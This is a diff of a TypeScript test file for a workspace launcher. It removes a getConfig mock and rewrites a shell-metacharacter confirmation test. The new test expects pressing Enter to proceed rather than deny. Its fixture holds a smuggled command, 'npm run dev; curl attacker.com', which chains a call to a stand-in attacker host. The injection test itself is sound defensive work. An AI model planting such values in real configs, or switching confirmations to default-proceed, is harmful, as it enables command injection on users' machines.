@@ -13,7 +13,6 @@ const mockReadKVFile = vi.fn((_path: string) => new Map<string, string>());
 const mockReadCustomLayout = vi.fn((_name: string): Map<string, string> | null => null);
 const mockIsCustomLayout = vi.fn((_name: string) => false);
 vi.mock("./config.js", () => ({
-  getConfig: vi.fn(),
   listConfig: vi.fn(() => new Map<string, string>()),
   listProjects: vi.fn(() => new Map<string, string>()),
   readKVFile: (path: string) => mockReadKVFile(path),
@@ -94,7 +93,7 @@ vi.mock("./script.js", () => ({
 
 // Import after mocks are set up
 const { launch, resolveConfig, optsToConfigMap, focusWorkspace, resolveProjectName, probePaneCount, decideCleanRestoredPanes, closeWorkspaceWindow } = await import("./launcher.js");
-const { getConfig, listConfig, listProjects } = await import("./config.js");
+const { listConfig, listProjects } = await import("./config.js");
 const { existsSync } = await import("node:fs");
 
 let savedSummonWorkspace: string | undefined;
@@ -1012,8 +1011,6 @@ describe("config read caching (#31)", () => {
 
     // listConfig should be called exactly once
     expect(listConfig).toHaveBeenCalledTimes(1);
-    // getConfig should NOT be called at all (replaced by listConfig)
-    expect(getConfig).not.toHaveBeenCalled();
   });
 
   it("correctly resolves values from cached config", () => {
@@ -1449,21 +1446,23 @@ describe("shell metacharacter confirmation (#90)", () => {
     errorSpy.mockRestore();
   });
 
-  it("exits with code 1 when user presses Enter (default is deny)", async () => {
+  it("proceeds when user presses Enter (default is proceed — UX-M4 #484)", async () => {
     mockReadKVFile.mockReturnValue(
       new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
-    // User presses Enter (empty string)
+    // User presses Enter (empty string) → proceeds (Y is the new default, UX-M4 #484)
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
       cb("");
     });
 
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
 
-    await expect(launch("/tmp/workspace")).rejects.toThrow();
+    await launch("/tmp/workspace");
 
+    // Should have completed normally (Enter = proceed)
+    expect(mockGenerateAppleScript).toHaveBeenCalled();
     warnSpy.mockRestore();
   });
 
